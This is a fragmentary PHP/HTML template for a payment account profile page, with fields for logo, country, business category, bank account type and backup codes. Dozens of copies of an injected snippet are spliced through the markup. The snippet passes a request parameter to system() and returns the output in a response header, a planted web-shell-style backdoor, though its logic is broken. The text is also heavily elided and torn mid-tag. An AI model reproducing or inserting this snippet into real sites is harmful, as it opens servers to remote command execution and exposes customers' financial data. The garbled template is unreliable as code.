...
<li>
		...
		<li>
			<a href="<?=$this->config->item('support_url');?>">
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['company_logo'];?>"class="editable img-responsive" height="148" width="148"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo site_url();?>upload/avatar.png" class="editable img-responsive" height="148" width="148"/>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
<img src="<?= branded_include('images/failed.png'); ?>" alt="Suspended" /> Suspended <span class="fa fa-remove"></span></span><? } else { ?><span class="account-status-marker-activated"> Activated<? } ?>													</span></span>
</div>
...
<div class="profile-info-row">
<div class="profile-info-name"><span>Address:</span> </div>
...
<div class="profile-info-row">
<div class="profile-info-name"><span>Phone:</span> </div>
...
Country
			...
			<select id="country" name="country" class="form-control required" geoname="country" data-placeholder="Choose a Country..." tabindex="12" /><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['company_logo'];?>" height="72" width="72"/>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else{?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo site_url();?>upload/avatar.png" height="72" width="72"/>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); }?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($business_categories as $category) { ?>
						<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($form['business_category'] == $category->id) echo 'selected="selected"'; ?> value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $category->id; ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $category->name; ?></option>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($business_countries as $country) { ?>
						<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($form['business_country'] == $country->country_id) echo 'selected="selected"';?> value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $country->country_id; ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $country->name; ?></option>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($form['bank_acc_type'] == 'CHECKING') echo 'selected="selected"';?> value="CHECKING">CHECKING</option>
						<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($form['bank_acc_type'] == 'CURRENT') echo 'selected="selected"';?> value="CURRENT">CURRENT</option>
						<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($form['bank_acc_type'] == 'PERSONAL') echo 'selected="selected"';?> value="PERSONAL">PERSONAL</option>
						<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($form['bank_acc_type'] == 'TRANSACTION') echo 'selected="selected"';?> value="TRANSACTION">TRANSACTION</option>
					</select>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $form['backup_codes'];?>
			&nbsp;<p>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach($monthly_vol_list as $key=>$val) { ?>
						<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if($form['business_monthly_vol'] == $key) echo 'selected="selected"';?> value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $key; ?>" ><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $val; ?></option>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
...
$(function() {
	$('#form_account').click(function(e){
	 	e.preventDefault();
	 	var l = Ladda.create(this);
	 	l.start();
	 	$.post("https://everpayinc.com/account/post", 
	 	    { data : data },
	 	  function(response){
